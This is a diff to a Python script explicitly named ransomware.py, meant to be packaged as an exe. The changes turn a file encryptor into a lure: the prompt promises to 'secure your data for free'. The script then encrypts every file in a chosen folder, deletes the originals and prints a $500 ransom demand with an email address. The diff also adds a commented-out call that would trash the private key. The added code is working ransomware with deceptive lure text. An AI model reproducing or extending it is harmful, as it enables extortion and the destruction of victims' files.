@@ -17,7 +17,7 @@ import binascii
 from os import listdir
 from os.path import isfile, join
 from colorama import Fore, Style, init
-
+from send2trash import send2trash
 # run pyinstaller ransomware.py to build exe
 
 init()
@@ -305,9 +305,16 @@ def MyRSAEncryptMAC(filepath, RSA_PublicKey_filepath, fileNumber):
     with open(parent + '\hmac_rsa_data_'+ str(bin(fileNumber)) + '.encrypted', 'w+') as f:
         json.dump(data, f)
 
+    # Remove original file
     os.remove(filepath)
-    print(Fore.LIGHTGREEN_EX + "Encrypting " + filepath)
-    print(RSACipher, c, iv, tag)
+
+    # Flavor text
+    if fileNumber == 0:
+        print(Fore.LIGHTGREEN_EX)
+        print(c)
+        print(" ") # new line
+
+    print(Fore.LIGHTGREEN_EX + "Encrypted " + filepath)
     return RSACipher, c, iv, tag, ext
 
 def MyRSADecryptMAC(filepath, RSA_PrivateKey_filepath, fileNumber):
@@ -359,7 +366,7 @@ def MyRSADecryptMAC(filepath, RSA_PrivateKey_filepath, fileNumber):
     originalfile_bytes = data + unpadder.finalize()
 
     # Print original files data in bytes
-    print(Fore.LIGHTGREEN_EX + "Decrypting" + filepath)
+    print(Fore.LIGHTGREEN_EX + "Decrypted " + filepath)
     #print(originalfile_bytes)
 
     # Create filepath and add proper file type extension
@@ -374,43 +381,76 @@ def MyRSADecryptMAC(filepath, RSA_PrivateKey_filepath, fileNumber):
 
 def main():
 
-    # Generate RSA key for key pairs
-    new_key = RSA.generate(4096)
+    # Create keys and hmac directories
+    if not os.path.exists(os.getcwd() + '\\keys\\'):
+        os.makedirs(os.getcwd() + '\\keys\\')
 
-    #print(os.getcwd())
-
-    # Create and write public key to pem file
-    public_key = new_key.publickey().exportKey("PEM")
-    #pub_key_filename = os.path.join('keys//rsa_public_key.pem') # FIX THIS FOR EXE DISTRIBUTABLE
-    f = open(os.getcwd() + '\\keys\\rsa_public_key.pem', 'wb')
-    f.write(public_key)
-    f.close()
-
-    # Create and write private key to pem file
-    private_key = new_key.exportKey("PEM")
-    #pri_key_filename = os.path.join('keys//rsa_private_key.pem') # FIX THIS FOR EXE DISTRIBUTABLE
-    f = open(os.getcwd() + '\\keys\\rsa_private_key.pem', 'wb')
-    f.write(private_key)
-    f.close()
+    if not os.path.exists(os.getcwd() + '\\hmac\\'):
+        os.makedirs(os.getcwd() + '\\hmac\\')
 
     # Ask for file path folder to encrypt
-    print(Fore.LIGHTCYAN_EX + "Enter Windows file path to encrypt. ex: C:/Users/someone/Documents/Example/ ")
-    confirmPath = input()
+    print(Fore.LIGHTCYAN_EX + "Enter Windows folder path to encrypt and secure your data for free!! ")
+    print("You can always decrypt desired folder by running this program again and entering encrypted folder path.")
+    print("   Example Path:        C:\\Users\\Jane Doe\\Documents\\Work\\")
+    confirmPath = input("   Folder Path:         ")
     mypath = confirmPath.replace("/", "\\")
 
-    # Initialize Filepaths for target file, public key, and private key
-    RSA_PublicKey_filepath = os.getcwd() + '\\keys\\rsa_public_key.pem'
-    RSA_PrivateKey_filepath = os.getcwd() + '\\keys\\rsa_private_key.pem'
+    isEncrypted = False
 
-    counter = 0
     for root, dirs, files in os.walk(mypath, topdown=True):
         for name in files:
-            MyRSAEncryptMAC(os.path.join(root, name), RSA_PublicKey_filepath, counter)
-            counter += 1
+            if(name[-10:] == '.encrypted'):
+                isEncrypted = True
+                break
+            break
 
-    checker = True
+    if(isEncrypted):
+        print("File(s) in the folder already encrypted. Locate 'rsa_private_key.pem' file and enter full file path to decrypt.")
+        print("   Example Path:        C:\\Users\\Jane Doe\\Downloads\\rsa_private_key.pem")
+        RSA_PrivateKey_filepath = input("   Private Key Path:    ")
+        counter = 0
+        for root, dirs, files in os.walk(mypath, topdown=True):
+            for name in files:
+                MyRSADecryptMAC(os.path.join(root, name), RSA_PrivateKey_filepath, counter)
+                counter += 1
+    else:
+        # Generate RSA key for key pairs
+        new_key = RSA.generate(4096)
+
+        # Create and write public key to pem file
+        public_key = new_key.publickey().exportKey("PEM")
+        f = open(os.getcwd() + '\\keys\\rsa_public_key.pem', 'wb')
+        f.write(public_key)
+        f.close()
+
+        # Create and write private key to pem file
+        private_key = new_key.exportKey("PEM")
+        f = open(os.getcwd() + '\\keys\\rsa_private_key.pem', 'wb')
+        f.write(private_key)
+        f.close()
+
+        # Send the private key file to recycling bin
+        # send2trash(os.getcwd() + '\\keys\\rsa_private_key.pem')
+
+        # Initialize Filepaths for target file, public key, and private key
+        RSA_PublicKey_filepath = os.getcwd() + '\\keys\\rsa_public_key.pem'
+        RSA_PrivateKey_filepath = os.getcwd() + '\\keys\\rsa_private_key.pem'
+
+        counter = 0
+        for root, dirs, files in os.walk(mypath, topdown=True):
+            for name in files:
+                MyRSAEncryptMAC(os.path.join(root, name), RSA_PublicKey_filepath, counter)
+                counter += 1
+
+        checker = True
+
+        print(Fore.LIGHTRED_EX + " \nHA HAHA HA. I WAS KIDDING. YOUR FILES ARE NOW ENCRYPTED FOREVER UNLESS \nYOU EMAIL 'someonewatsitoya@gmail.com' AND SEND $500. ONCE THE $500 IS SENT,")
+        print("FURTHER INSTRUCTIONS FOR DECRYPTING YOUR FILES WILL BE SENT")
+
+    exit = input("Press [ENTER] to exit program...")
 
     # When encrypted, ask to decrypt files
+    '''
     while (checker):
         confirm = input("Would you like to decrypt? Y/N ")
         confirm = confirm.upper()
@@ -428,6 +468,6 @@ def main():
             checker = False
         else:
             print("Invalid Input")
-
+    '''
 # Execute main function
 main()
